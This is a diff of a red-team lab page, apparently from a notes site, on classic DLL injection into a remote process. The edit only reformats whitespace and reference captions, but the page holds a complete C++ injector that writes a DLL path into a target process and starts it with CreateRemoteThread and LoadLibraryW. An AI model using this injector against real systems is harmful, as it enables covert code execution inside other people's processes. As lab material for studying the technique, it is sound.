@@ -11,19 +11,19 @@ This lab attempts a classic DLL injection into a remote process.
 {% code title="inject-dll.cpp" %}
 ```cpp
 int main(int argc, char *argv[]) {
-	HANDLE processHandle;
-	PVOID remoteBuffer;
-	wchar_t dllPath[] = TEXT("C:\\experiments\\evilm64.dll");
-	
-	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
-	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
-	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
-	CloseHandle(processHandle); 
-	
-	return 0;
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    wchar_t dllPath[] = TEXT("C:\\experiments\\evilm64.dll");
+
+    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);    
+    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+    CloseHandle(processHandle); 
+
+    return 0;
 }
 ```
 {% endcode %}
@@ -55,9 +55,7 @@ Note how the notepad spawned rundll32 which then spawned a cmd.exe because of th
 
 ## References
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212\(v=vs.85\).aspx" %}
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212\(v=vs.85\).aspx" caption="" %}
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175\(v=vs.85\).aspx" %}
-
-
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175\(v=vs.85\).aspx" caption="" %}
 
